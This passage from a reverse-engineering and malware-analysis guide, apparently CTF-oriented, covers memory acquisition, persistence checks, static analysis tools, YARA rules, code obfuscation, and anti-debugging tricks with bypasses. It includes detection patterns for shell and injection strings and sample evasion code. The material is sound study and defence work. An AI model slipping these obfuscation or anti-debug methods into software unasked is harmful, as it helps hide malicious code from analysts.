REM Dump running process
procdump -ma <PID> output.dmp

REM Dump on exception
procdump -ma -e -f "" <PID>

REM Timed dumps
procdump -ma -s 5 -n 10 <PID>
REM Every 5 seconds, 10 times
```

**Volatility Live Memory**

```bash
# Acquire live memory (Linux)
# Using LiME
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src
make
sudo insmod lime.ko "path=/tmp/memory.lime format=lime"

# Acquire (Windows)
# Use WinPmem or DumpIt
winpmem.exe physmem.raw
```

### Behavioral Indicators

**Persistence Mechanisms (Windows)**

```cmd
REM Registry Run keys
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce

REM Startup folder
dir "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
dir "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Services
sc query | findstr "SERVICE_NAME"
reg query HKLM\SYSTEM\CurrentControlSet\Services

REM Scheduled tasks
schtasks /query /fo LIST /v

REM WMI Event Subscriptions
wmic /namespace:\\root\subscription PATH __EventFilter GET /FORMAT:list
wmic /namespace:\\root\subscription PATH CommandLineEventConsumer GET /FORMAT:list
```

**Persistence Mechanisms (Linux)**

```bash
# Cron jobs
crontab -l
cat /etc/crontab
ls /etc/cron.*

# Systemd services
systemctl list-unit-files --type=service
ls /etc/systemd/system/
ls /usr/lib/systemd/system/

# Init scripts
ls /etc/init.d/
ls /etc/rc*.d/

# Shell profiles
cat ~/.bashrc
cat ~/.bash_profile
cat /etc/profile
cat /etc/bash.bashrc

# LD_PRELOAD
cat /etc/ld.so.preload

# PAM modules
ls /lib/security/
cat /etc/pam.d/*
```

### Automated Unpacking

**Malware may be packed/encrypted to evade analysis**

**Generic Unpacking**

```bash
# Run until OEP (Original Entry Point)
# Let malware unpack itself in debugger

# GDB method:
# 1. Set breakpoint on VirtualProtect/VirtualAlloc
# 2. Let code unpack
# 3. Dump at suspicious memory regions

# x64dbg method:
# Plugins â†’ Scylla â†’ IAT Autosearch + Get Imports
# Dump unpacked region
```

**Automatic Unpacking Tools**

```bash
# upx (if UPX packed)
upx -d packed.exe

# de4dot (.NET deobfuscator)
de4dot packed.dll

# unipacker (generic unpacker)
pip install unipacker
unipacker packed.exe

# FLARE-EMU (Frida-based)
# Emulation-based unpacking
```

**Important Related Topics:**

- **Obfuscation Techniques**: String encryption, control flow flattening, API hashing
- **Shellcode Analysis**: Analyzing position-independent code, egg hunters
- **Exploit Development**: Buffer overflows, ROP chains, heap exploitation
- **Cryptographic Analysis**: Identifying crypto algorithms, key recovery, custom encryption

---

## Static Analysis

Static analysis examines executables without running them, revealing structure, strings, functions, and logic through disassembly and decompilation.

### File Identification and Basic Analysis

**File Type Detection**

```bash
# Identify file type
file <binary>

# Detect architecture and format
file <binary> | grep -E "ELF|PE32|Mach-O|x86-64|ARM|MIPS"

# Get detailed file information
readelf -h <elf_binary>
objdump -f <binary>

# PE file analysis (Windows executables)
file <pe_binary>
# Expected: PE32 executable (GUI) x86-64, for MS Windows
```

**String Extraction**

```bash
# Extract ASCII strings
strings <binary>

# Minimum string length
strings -n 10 <binary>

# Show offset of strings
strings -t x <binary>

# Unicode strings (Windows binaries)
strings -e l <binary>

# All encodings
strings -a <binary>

# Search for specific patterns
strings <binary> | grep -i "flag\|password\|key"

# Extract with offsets and save
strings -t x <binary> > strings_output.txt

# rabin2 strings (from radare2)
rabin2 -z <binary>        # Data section strings
rabin2 -zz <binary>       # All strings including binary
```

**Binary Information Gathering**

```bash
# File entropy (detect packing/encryption)
ent <binary>
# High entropy (>7.5) suggests packing or encryption

# rabin2 comprehensive info
rabin2 -I <binary>        # Binary info
rabin2 -i <binary>        # Imports
rabin2 -E <binary>        # Exports
rabin2 -s <binary>        # Symbols
rabin2 -S <binary>        # Sections
rabin2 -l <binary>        # Linked libraries

# ELF specific
readelf -a <elf_binary>
readelf -s <elf_binary>   # Symbol table
readelf -d <elf_binary>   # Dynamic section
readelf -r <elf_binary>   # Relocations

# PE specific (pefile - Python)
python3 -c "import pefile; pe=pefile.PE('binary.exe'); print(pe.dump_info())"
```

**Check for Packing/Obfuscation**

```bash
# Detect common packers with PEiD signatures
# Install: apt install peid-ng (if available) or use Windows version

# DIE (Detect It Easy)
die <binary>

# Manual packer detection
rabin2 -S <binary> | grep -E "UPX|MPRESS|ASPack|PECompact"

# Check section names (packed binaries have unusual sections)
objdump -h <binary>

# Entropy analysis with binwalk
binwalk -E <binary>
```

### Disassembly Tools

**objdump - GNU Binary Utilities**

```bash
# Disassemble all executable sections
objdump -d <binary>

# Disassemble with source code (if available)
objdump -S <binary>

# Intel syntax (more readable)
objdump -M intel -d <binary>

# Disassemble specific section
objdump -j .text -d <binary>

# Show file headers
objdump -f <binary>

# Show section headers
objdump -h <binary>

# Show all headers
objdump -x <binary>

# Disassemble and save to file
objdump -M intel -d <binary> > disassembly.asm
```

**radare2 - Advanced Reverse Engineering Framework**

```bash
# Open binary in radare2
r2 <binary>

# Open in write mode
r2 -w <binary>

# Open without analysis
r2 -n <binary>

# Analyze binary
r2 -A <binary>

# Inside r2:
aaa                 # Analyze all
afl                 # List functions
pdf @main           # Disassemble main function
pdf @sym.main       # Alternative syntax
s main              # Seek to main
V                   # Visual mode
VV                  # Visual graph mode
q                   # Quit

# Useful commands inside r2:
ie                  # Entry points
ii                  # Imports
iE                  # Exports
iz                  # Strings in data sections
izz                 # All strings
axt <address>       # Cross-references to address
axf <address>       # Cross-references from address
/R <opcodes>        # Search for opcodes
/ <string>          # Search for string

# Print function disassembly
pdf @sym.check_password

# Hex dump
px 100 @ <address>

# Analyze function arguments
afvd                # Function variables

# Rename function
afn new_name @ <address>

# Set architecture
e asm.arch=x86
e asm.bits=64
```

**Ghidra - NSA Reverse Engineering Tool**

```bash
# Launch Ghidra
ghidraRun

# Headless analysis (scripted)
analyzeHeadless /path/to/project ProjectName -import <binary> -postScript script.py

# GUI Workflow:
# 1. File -> New Project
# 2. Import File
# 3. Auto-analyze (select default options)
# 4. CodeBrowser opens with:
#    - Disassembly window
#    - Decompiler window (C-like pseudocode)
#    - Function graph
#    - Symbol tree

# Ghidra shortcuts:
# G - Go to address
# L - Label/rename
# ; - Add comment
# Ctrl+Shift+E - Edit function signature
# Right-click variable -> Retype variable
```

**IDA Free/Pro - Industry Standard Disassembler**

```bash
# Open with IDA
ida64 <binary>       # 64-bit binary
ida <binary>         # 32-bit binary

# IDA shortcuts:
# Space - Toggle graph/text view
# X - Cross-references to address
# N - Rename
# Y - Change function type
# / - Add comment
# ; - Add repeatable comment
# G - Jump to address
# F5 - Decompile (IDA Pro only)

# IDA Python scripting
# View -> Open subviews -> Python
```

### Decompilation

**Ghidra Decompiler**

- **Automatic**: Opens alongside disassembly
- **Features**:
    - Type propagation
    - Control flow reconstruction
    - Variable renaming
    - Function signature editing

**Snowman Decompiler** (standalone)

```bash
# Install snowman
apt install snowman

# Use via GUI or as plugin for IDA/radare2
```

**retdec - Retargetable Decompiler**

```bash
# Install retdec
git clone https://github.com/avast/retdec
cd retdec && mkdir build && cd build
cmake .. && make

# Decompile binary
retdec-decompiler <binary>

# Output: binary.c (C-like pseudocode)

# With symbols
retdec-decompiler --keep-unreachable-funcs <binary>
```

**Hex-Rays Decompiler** (IDA Pro plugin)

- Commercial plugin for IDA Pro
- Produces high-quality C-like pseudocode
- Industry standard for professional reverse engineering

### Function Analysis

**Identify Key Functions**

```bash
# radare2: List functions
r2 -A <binary>
[0x00000000]> afl

# Functions of interest:
# - main
# - Functions with strings like "password", "flag", "check"
# - Cryptographic function names (AES, RC4, base64)
# - Input/output functions (scanf, printf, read, write)

# Search for function calls
[0x00000000]> axt sym.imp.strcmp
# Shows where strcmp is called

# Analyze control flow
[0x00000000]> pdf @sym.check_flag
# Look for comparisons, conditional jumps
```

**Control Flow Analysis**

```bash
# Generate control flow graph with radare2
r2 -A <binary>
[0x00000000]> s main
[0x00000000]> VV    # Visual graph mode

# Export graph
[0x00000000]> agf > cfg.dot
dot -Tpng cfg.out -o cfg.png

# Ghidra: Automatic in Function Graph view
# IDA: View -> Graph or Space bar
```

**Cross-Reference Analysis**

```bash
# radare2: Find all references to address
axt <address>       # References TO address
axf <address>       # References FROM address

# Find calls to specific function
axt sym.imp.system

# Track string usage
iz | grep "password"
# Note address, then:
axt <string_address>
```

### Import/Export Analysis

**Identify Dangerous Functions**

```bash
# List imports
rabin2 -i <binary>

# Dangerous functions to look for:
# - system, exec*, popen: Command execution
# - strcpy, sprintf, gets: Buffer overflow
# - strcmp, strncmp: Password comparison (timing attacks)
# - malloc, free: Heap manipulation
# - ptrace: Anti-debugging
# - fork, clone: Process manipulation

# Check for specific import
rabin2 -i <binary> | grep -i "system\|exec\|strcpy"

# ELF GOT/PLT analysis
objdump -R <binary>     # Relocations (GOT entries)
readelf -r <binary>
```

**Export Analysis** (libraries, shared objects)

```bash
# List exports
rabin2 -E <binary>

# nm for symbols
nm -D <library.so>      # Dynamic symbols
nm <library.a>          # Static symbols

# Find specific export
nm -D <library.so> | grep "function_name"
```

### Section Analysis

**ELF Sections**

```bash
# List sections
readelf -S <elf_binary>

# Key sections:
# .text    - Executable code
# .rodata  - Read-only data (strings, constants)
# .data    - Initialized data
# .bss     - Uninitialized data
# .plt     - Procedure Linkage Table
# .got     - Global Offset Table

# Dump section contents
objdump -s -j .rodata <binary>

# Extract section to file
objcopy --dump-section .rodata=rodata.bin <binary>

# radare2 section info
r2 <binary>
[0x00000000]> iS
```

**PE Sections** (Windows executables)

```bash
# Analyze with pefile (Python)
python3 << EOF
import pefile
pe = pefile.PE('binary.exe')
for section in pe.sections:
    print(f"{section.Name.decode().strip()}: {hex(section.VirtualAddress)}, Size: {section.SizeOfRawData}")
EOF

# Common sections:
# .text    - Code
# .data    - Data
# .rdata   - Read-only data
# .rsrc    - Resources (icons, dialogs, strings)

# Extract resources
wrestool -x binary.exe -o extracted/

# Analyze resources
PE Explorer (Windows tool) or Resource Hacker
```

### Static Malware Analysis

**Behavioral Indicators**

```bash
# Check for suspicious strings
strings <binary> | grep -E "http|ftp|tcp|socket|shell|cmd|powershell|/bin/sh"

# Look for registry keys (Windows)
strings <binary.exe> | grep -i "\\SOFTWARE\\Microsoft\\Windows"

# File operations
strings <binary> | grep -E "fopen|CreateFile|open|read|write"

# Network operations
strings <binary> | grep -E "socket|connect|recv|send|WSAStartup"

# Check for embedded IPs
strings <binary> | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}"

# Check for URLs
strings <binary> | grep -oE "https?://[a-zA-Z0-9./?=_%:-]*"
```

**Heuristic Analysis**

```bash
# Check entropy by section (detect encrypted payloads)
rabin2 -S <binary>
# Manually calculate or use binwalk -E

# Unusual entry point
rabin2 -e <binary>
# Compare with typical entry points

# Suspicious imports
rabin2 -i <binary> | grep -E "VirtualAlloc|WriteProcessMemory|CreateRemoteThread"

# Code caves (padding with executable permissions)
rabin2 -S <binary> | awk '$3 ~ /x/ && $4 > 1000'
```

### Scripting Static Analysis

**Python with angr**

```python
#!/usr/bin/env python3
import angr

# Load binary
proj = angr.Project('./binary', auto_load_libs=False)

# Get entry point
print(f"Entry point: {hex(proj.entry)}")

# List functions
cfg = proj.analyses.CFGFast()
for func in cfg.functions.values():
    print(f"{hex(func.addr)}: {func.name}")

# Find main function
main = proj.loader.main_object.get_symbol('main')
print(f"Main at: {hex(main.rebased_addr)}")

# Disassemble basic block
block = proj.factory.block(proj.entry)
block.pp()  # Pretty print disassembly
```

**r2pipe - Radare2 Python Binding**

```python
#!/usr/bin/env python3
import r2pipe

# Open binary
r2 = r2pipe.open('./binary')

# Analyze
r2.cmd('aaa')

# Get functions
functions = r2.cmdj('aflj')  # JSON output
for func in functions:
    print(f"{func['name']}: {hex(func['offset'])}")

# Disassemble function
main_disasm = r2.cmd('pdf @main')
print(main_disasm)

# Search for strings
strings = r2.cmdj('izj')
for s in strings:
    if 'flag' in s['string'].lower():
        print(f"Found at {hex(s['vaddr'])}: {s['string']}")

# Find cross-references
xrefs = r2.cmdj('axtj @sym.imp.strcmp')
for xref in xrefs:
    print(f"strcmp called from {hex(xref['from'])}")
```

**YARA Rules for Pattern Matching**

```yara
rule CryptoConstants {
    meta:
        description = "Detect cryptographic constants"
    strings:
        $aes_sbox = { 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76 }
        $md5_init = { 01 23 45 67 89 AB CD EF }
        $sha256_init = { 6A 09 E667 BB 67 AE85 }
    condition:
        any of them
}

rule SuspiciousAPIs {
    meta:
        description = "Dangerous API calls"
    strings:
        $api1 = "VirtualAlloc" ascii
        $api2 = "WriteProcessMemory" ascii
        $api3 = "CreateRemoteThread" ascii
    condition:
        2 of them
}
```

```bash
# Run YARA scan
yara rules.yar <binary>

# Recursive directory scan
yara -r rules.yar /path/to/binaries/

# Print matching strings
yara -s rules.yar <binary>
```

### Assembly Pattern Recognition

**Common Patterns**

**Function Prologue/Epilogue**

```nasm
; x86-64 function prologue
push    rbp
mov     rbp, rsp
sub     rsp, 0x20       ; Allocate stack space

; Function epilogue
leave                   ; mov rsp, rbp; pop rbp
ret

; x86 (32-bit)
push    ebp
mov     ebp, esp
sub     esp, 0x10
```

**String Comparison**

```nasm
; strcmp pattern
lea     rax, [string1]
lea     rdi, [string2]
call    strcmp
test    eax, eax
jz      success_branch  ; Jump if strings equal

; Manual comparison loop
xor     eax, eax
.loop:
    movzx   ecx, byte [rdi+rax]
    cmp     byte [rsi+rax], cl
    jne     .not_equal
    inc     rax
    test    cl, cl
    jnz     .loop
```

**XOR Encoding/Decoding**

```nasm
; XOR decode loop
mov     rcx, length
xor     eax, eax
.decode_loop:
    mov     dl, byte [buffer+rax]
    xor     dl, key
    mov     byte [buffer+rax], dl
    inc     rax
    loop    .decode_loop
```

**Base64 Encoding Indicators**

```nasm
; Base64 alphabet string
"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

; Lookup table access
movzx   eax, byte [alphabet+rbx]
```

## Code Obfuscation Techniques

Code obfuscation deliberately makes reverse engineering difficult through control flow manipulation, code transformation, and anti-analysis techniques.

### Control Flow Obfuscation

**Opaque Predicates**

Opaque predicates are conditions with predetermined outcomes that appear complex:

```nasm
; Always true opaque predicate
mov     eax, some_value
imul    eax, eax        ; x^2
add     eax, some_value ; x^2 + x
and     eax, 1          ; (x^2 + x) & 1 always equals 0
jz      real_code       ; Always taken

dead_code:
    ; Never executed
    int3
    ud2

real_code:
    ; Actual functionality
```

**Control Flow Flattening**

Converts structured control flow into flat switch-case dispatcher:

```c
// Original code
if (condition1) {
    block1();
} else {
    block2();
}
block3();

// Flattened (obfuscated)
int state = 0;
while (true) {
    switch (state) {
        case 0:
            if (condition1) state = 1;
            else state = 2;
            break;
        case 1:
            block1();
            state = 3;
            break;
        case 2:
            block2();
            state = 3;
            break;
        case 3:
            block3();
            return;
    }
}
```

**Indirect Jumps and Calls**

```nasm
; Direct call (easy to analyze)
call    function

; Indirect call (obfuscated)
lea     rax, [function]
add     rax, 0          ; Noise instruction
call    rax

; Jump table obfuscation
mov     eax, index
lea     rbx, [jump_table]
mov     rax, [rbx+rax*8]
jmp     rax
```

**Dead Code Insertion**

```nasm
; Real instruction
mov     rax, important_value

; Dead code (never affects program)
push    rbx
pop     rbx
xor     rcx, rcx
add     rcx, 0

; Continue real code
call    function
```

### Identifying Control Flow Obfuscation

**Radare2 Analysis**

```bash
r2 -A <binary>

# Check function complexity
[0x00000000]> afC @main
# High cyclomatic complexity indicates obfuscation

# Visualize control flow
[0x00000000]> VV

# Look for:
# - Excessive basic blocks
# - Many indirect jumps
# - Flat switch-case structures
# - Unreachable code
```

**Ghidra Decompilation**

- Heavily nested or flat switch statements
- Excessive goto statements
- Variables with unclear purpose
- Dead code identified by decompiler

**Automated De-obfuscation**

```bash
# Miasm framework for deobfuscation
git clone https://github.com/cea-sec/miasm
cd miasm
python3 setup.py install

# Simplify symbolic execution
# Custom scripts required for specific obfuscation
```

### String Obfuscation

**Stack Strings**

```nasm
; Obfuscated: Build string on stack
push    0x0064726f77    ; "word"
push    0x73736170      ; "pass"
mov     rdi, rsp        ; Pointer to "password"
```

```bash
# Detection: Look for multiple push operations followed by stack pointer usage
r2 <binary>
/c push.*push.*push.*mov.*rsp
```

**XOR Encrypted Strings**

```nasm
; Encrypted string in .data
encrypted_str: db 0x1A, 0x0B, 0x1F, ...

; Runtime decryption
mov     rcx, string_length
lea     rsi, [encrypted_str]
.decrypt:
    xor     byte [rsi], 0x42  ; XOR key
    inc     rsi
    loop    .decrypt
```

**Decryption Script**

```python
#!/usr/bin/env python3

# Extract encrypted bytes from binary
encrypted = bytes.fromhex("1A0B1F0C1D")
key = 0x42

# Decrypt
decrypted = bytes([b ^ key for b in encrypted])
print(decrypted.decode())

# Or multi-byte XOR
def xor_decrypt(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

encrypted = b"\x1a\x0b\x1f\x0c"
key = b"\x42\x13"
print(xor_decrypt(encrypted, key))
```

**Base64 Encoding**

```bash
# Detect base64 alphabet
strings <binary> | grep "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# Find base64-encoded strings
strings <binary> | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$"

# Decode
echo "c2VjcmV0X2ZsYWc=" | base64 -d
```

### API Obfuscation

**Dynamic Import Resolution**

```nasm
; Instead of direct import
call    [rel MessageBoxA]

; Obfuscated: Load library and resolve at runtime
lea     rcx, [user32_str]      ; "user32.dll"
call    LoadLibraryA
mov     r15, rax                ; Save handle

lea     rcx, [msgbox_str]       ; "MessageBoxA"
mov     rdx, r15
call    GetProcAddress
mov     r14, rax                ; Function pointer

; Later call
mov     rcx, hwnd
lea     rdx, [message]
lea     r8, [title]
xor     r9, r9
call    r14                     ; Call MessageBoxA
```

**API Hashing**

```c
// Resolve API by hash instead of name
DWORD hash_api(char *name) {
    DWORD hash = 0;
    while (*name) {
        hash = ((hash << 5) + hash) + *name++;
    }
    return hash;
}

// Usage
FARPROC resolve_api(DWORD hash) {
    // Walk export table, hash each name, compare
}
```

### Instruction Substitution

**Equivalent Instructions**

```nasm
; mov eax, 0
xor     eax, eax          ; Equivalent, smaller
sub     eax, eax          ; Equivalent
and     eax, 0            ; Equivalent
imul    eax, 0            ; Equivalent

; mov eax, 1
xor     eax, eax
inc     eax

; mov eax, -1
or      eax, -1
xor     eax, eax
dec     eax

; nop (no operation)
xchg    eax, eax          ; 0x87 0xC0
mov     eax, eax          ; Not actual nop, but similar effect
lea     eax, [eax+0]
```

**Arithmetic Substitution**

```nasm
; add eax, 5
sub     eax, -5

; sub eax, 3
add     eax, -3
lea     eax, [eax-3]

; mul by 2
shl     eax, 1
add     eax, eax

; divide by 2
shr     eax, 1
```

### Packing and Compression

**Common Packers**

- **UPX**: Universal Packer for eXecutables
- **MPRESS**: High compression packer
- **Themida**: Commercial protector with virtualization
- **VMProtect**: Code virtualization
- **ASPack**: Compression and encryption

**Detecting Packers**

```bash
# Automated detection
die <binary>

# Check section names
rabin2 -S <binary>
# Look for: UPX0, UPX1, .packed, .protect

# Entropy analysis
binwalk -E <binary>
# High entropy (>7.5) in executable sections

# Entry point in unusual section
rabin2 -e <binary>
rabin2 -S <binary>
# Compare entry point address with section ranges
```

**Unpacking UPX**

```bash
# Automatic unpacking
upx -d <packed_binary> -o <unpacked_binary>

# Verify
file <unpacked_binary>

# Manual unpacking if modified:
# 1. Find OEP (Original Entry Point) with debugger
# 2. Dump memory at OEP
# 3. Fix IAT (Import Address Table)
```

**Manual Unpacking Steps**

1. **Find OEP** (Original Entry Point):
    
    - Set breakpoint at end of unpacking stub
    - Common instructions before OEP: `pushad` followed by unpack loop, then `popad; jmp OEP`
2. **Dump Process**:
    
    ```bash
    # Using gdb
    gdb <binary>
    (gdb) break *0x<OEP_address>
    (gdb) run
    (gdb) generate-core-file dump.core
    
    # Convert core to executable
    # Manual process involving fixing headers
    ```
    
3. **Fix IAT**:
    
    - Import Address Table needs reconstruction
    - Tools: Scylla, Import REConstructor

## Anti-Debugging Detection

Anti-debugging techniques detect or prevent debugger attachment, hindering dynamic analysis.

### Windows Anti-Debugging Techniques

**IsDebuggerPresent API**

```c
// Simple check
if (IsDebuggerPresent()) {
    exit(1);  // or malicious behavior
}
```

```nasm
; Assembly implementation
call    IsDebuggerPresent
test    eax, eax
jnz     debugger_detected
```

**Bypass**:

```bash
# Patch return value in debugger
# Or patch binary:
# Change jnz to jz or nop out the check
r2 -w <binary>
[0x00000000]> /c call.*IsDebuggerPresent
# Note address
[0x00000000]> s <address>
[0x00000000]> pd 3
[0x00000000]> wa nop; nop @ <jnz_address>
```

**PEB (Process Environment Block) Checks**

```c
// Check PEB.BeingDebugged flag
BOOL check_peb() {
    PPEB peb = (PPEB)__readgsqword(0x60);  // x64
    return peb->BeingDebugged;
}
```

```nasm
; x64 assembly
mov     rax, gs:[60h]     ; PEB address
cmp     byte [rax+2], 0   ; BeingDebugged offset
jne     debugger_detected
```

**Bypass**:

```bash
# In debugger, modify PEB.BeingDebugged
# x64dbg: Modify memory at gs:[60h]+2 to 0
# Or use ScyllaHide plugin
```

**NtGlobalFlag Check**

```c
// PEB.NtGlobalFlag set when debugging
PPEB peb = (PPEB)__readgsqword(0x60);
if (peb->NtGlobalFlag & 0x70) {  // FLG_HEAP_* flags
    // Debugger detected
}
```

```nasm
; Assembly
mov     rax, gs:[60h]
mov     eax, [rax+0BCh]   ; NtGlobalFlag offset (x64)
and     eax, 70h
jnz     debugger_detected
```

**Heap Flags Check**

```c
// Heap flags differ when debugging
PVOID heap = GetProcessHeap();
DWORD flags = *(DWORD*)((BYTE*)heap + 0x70);  // Flags offset varies
if (flags & 0x40000062) {  // Debug flags
    // Detected
}
```

**CheckRemoteDebuggerPresent**

```c
BOOL isDebugged = FALSE;
CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
if (isDebugged) {
    exit(1);
}
```

**NtQueryInformationProcess**

```c
typedef NTSTATUS (WINAPI *pfnNtQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

BOOL check_debug_port() {
    HANDLE hProcess = GetCurrentProcess();
    DWORD debugPort = 0;
    pfnNtQueryInformationProcess NtQIP = (pfnNtQueryInformationProcess)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    
    NtQIP(hProcess, 7, &debugPort, sizeof(debugPort), NULL);  // ProcessDebugPort
    return debugPort != 0;
}
```

### Linux Anti-Debugging Techniques

**ptrace Self-Attach**

```c
// Only one process can ptrace at a time
if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
    // Already being traced
    exit(1);
}
```

**Bypass**:

```bash
# Patch ptrace call
r2 -w <binary>
[0x00000000]> /c call.*ptrace
[0x00000000]> s <address>
[0x00000000]> wa mov eax, 0; nop; nop @ <call_address>
```

**/proc/self/status Parsing**

```c
// Check TracerPid in /proc/self/status
FILE *fp = fopen("/proc/self/status", "r");
char line[256];
while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "TracerPid:", 10) == 0) {
        int pid = atoi(line + 10);
        if (pid != 0) {
            // Being debugged
            exit(1);
        }
    }
}
fclose(fp);
```

**Bypass**:

```bash
# Hook open/fopen to return fake file
# Or modify binary to skip check
```

**Parent Process Check**

```c
// Check if parent is a known debugger
int ppid = getppid();
char path[256];
snprintf(path, sizeof(path), "/proc/%d/exe", ppid);
char parent[256];
readlink(path, parent, sizeof(parent));

if (strstr(parent, "gdb") || strstr(parent, "lldb") || strstr(parent, "radare2")) {
    exit(1);
}

**LD_PRELOAD Detection**

// Check for LD_PRELOAD environment variable 
char *preload = getenv("LD_PRELOAD"); 
if (preload != NULL) { 
	// Library injection detected 
	exit(1); 
}
````

**Timing Checks**

```c
// Measure execution time between two points
#include <time.h>

clock_t start = clock();
// ... sensitive code ...
clock_t end = clock();

double elapsed = (double)(end - start) / CLOCKS_PER_SEC;
if (elapsed > 0.01) {  // Threshold
    // Likely being debugged (breakpoints slow execution)
    exit(1);
}
````

```c
// Using rdtsc (Read Time-Stamp Counter)
static inline uint64_t rdtsc() {
    uint32_t lo, hi;
    __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

uint64_t start = rdtsc();
// ... sensitive code ...
uint64_t end = rdtsc();

if (end - start > 10000) {  // Threshold in CPU cycles
    // Debugger detected
}
```

### Breakpoint Detection

**INT3 Scanning**

```c
// Scan code section for software breakpoints (0xCC)
void check_breakpoints(void *func_start, size_t size) {
    unsigned char *code = (unsigned char *)func_start;
    for (size_t i = 0; i < size; i++) {
        if (code[i] == 0xCC) {  // INT3
            exit(1);
        }
    }
}
```

**Hardware Breakpoint Detection**

```c
// Check debug registers (DR0-DR7)
#include <sys/ptrace.h>
#include <sys/user.h>

void check_hardware_breakpoints() {
    struct user_regs_struct regs;
    unsigned long dr0, dr1, dr2, dr3, dr7;
    
    // Read debug registers (requires privileges)
    if (ptrace(PTRACE_PEEKUSER, getpid(), 
               offsetof(struct user, u_debugreg[0]), 0) != 0) {
        exit(1);  // Hardware breakpoints set
    }
}
```

**Windows Hardware Breakpoint Check**

```c
CONTEXT ctx = {0};
ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
GetThreadContext(GetCurrentThread(), &ctx);

if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
    // Hardware breakpoints detected
    exit(1);
}
```

### Exception-Based Anti-Debugging

**Structured Exception Handling (SEH) - Windows**

```c
__try {
    // Trigger exception
    *(int*)0 = 0;  // Access violation
} __except(EXCEPTION_EXECUTE_HANDLER) {
    // Normal execution path
    // Debuggers may not handle this correctly
}
```

**Invalid Instructions**

```nasm
; Use privileged instruction in user mode
int3        ; Software breakpoint (debuggers handle differently)
ud2         ; Undefined instruction
int 2Dh     ; Windows kernel debugger interrupt
```

**Vectored Exception Handler (VEH)**

```c
LONG WINAPI VEH_Handler(EXCEPTION_POINTERS *pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // Single-step exception (debugger stepping?)
        exit(1);
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// Register handler
AddVectoredExceptionHandler(1, VEH_Handler);

// Trigger single-step by setting trap flag
__asm {
    pushfd
    or dword ptr [esp], 0x100  ; Set TF (Trap Flag)
    popfd
}
```

### Bypassing Anti-Debugging

**ScyllaHide** (x64dbg plugin)

```bash
# Install ScyllaHide
# Download from: https://github.com/x64dbg/ScyllaHide

# Configure in x64dbg:
# Plugins -> ScyllaHide -> Options
# Enable all anti-debug bypasses:
# - PEB.BeingDebugged
# - PEB.NtGlobalFlag
# - Heap Flags
# - NtQueryInformationProcess hooks
# - NtSetInformationThread hooks
# - OutputDebugString
# - Timing checks
```

**Binary Patching**

```bash
# Identify anti-debug checks
r2 -A <binary>
[0x00000000]> /c call.*IsDebuggerPresent
[0x00000000]> /c ptrace

# Patch out checks
r2 -w <binary>
[0x00000000]> s <anti_debug_address>

# Option 1: NOP out the check
[0x00000000]> wa nop; nop; nop; nop; nop

# Option 2: Force return value
[0x00000000]> wa xor eax, eax; ret

# Option 3: Invert jump condition
[0x00000000]> wa jz <original_jnz_target>

# Save patched binary
[0x00000000]> q
```

**Hook Functions with LD_PRELOAD** (Linux)

```c
// anti_debug_bypass.c
#include <sys/ptrace.h>
#include <stdio.h>

// Hook ptrace
long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data) {
    if (request == PTRACE_TRACEME) {
        // Return success without actually tracing
        return 0;
    }
    // Call original for other requests
    return 0;
}

// Hook getppid
pid_t getppid(void) {
    return 1;  // Fake parent PID (init)
}

// Compile:
// gcc -shared -fPIC anti_debug_bypass.c -o bypass.so

// Usage:
// LD_PRELOAD=./bypass.so ./binary
```

**Windows API Hooking**

```c
// Hook IsDebuggerPresent
#include <windows.h>
#include <detours.h>

static BOOL (WINAPI *Real_IsDebuggerPresent)(VOID) = IsDebuggerPresent;

BOOL WINAPI Hooked_IsDebuggerPresent(VOID) {
    return FALSE;  // Always return not debugging
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)Real_IsDebuggerPresent, Hooked_IsDebuggerPresent);
        DetourTransactionCommit();
    }
    return TRUE;
}

// Compile as DLL and inject into target process
```

**GDB Anti-Anti-Debug**

```bash
# Start gdb
gdb <binary>

# Catch ptrace calls
(gdb) catch syscall ptrace
(gdb) commands
> return 0
> continue
> end

# Skip anti-debug function entirely
(gdb) break anti_debug_function
(gdb) commands
> return
> continue
> end

# Modify PEB (Windows under Wine/gdb)
(gdb) set {char}($fs_base + 0x60 + 2) = 0

# Continue execution
(gdb) run
```

**Frida Dynamic Instrumentation**

```javascript
// Bypass IsDebuggerPresent
if (Process.platform === 'windows') {
    var IsDebuggerPresent = Module.findExportByName('kernel32.dll', 'IsDebuggerPresent');
    Interceptor.replace(IsDebuggerPresent, new NativeCallback(function () {
        return 0;  // Not debugging
    }, 'int', []));
}

// Bypass ptrace (Linux)
if (Process.platform === 'linux') {
    var ptrace = Module.findExportByName(null, 'ptrace');
    Interceptor.replace(ptrace, new NativeCallback(function (request, pid, addr, data) {
        if (request === 0) {  // PTRACE_TRACEME
            return 0;  // Success
        }
        return this.ptrace(request, pid, addr, data);
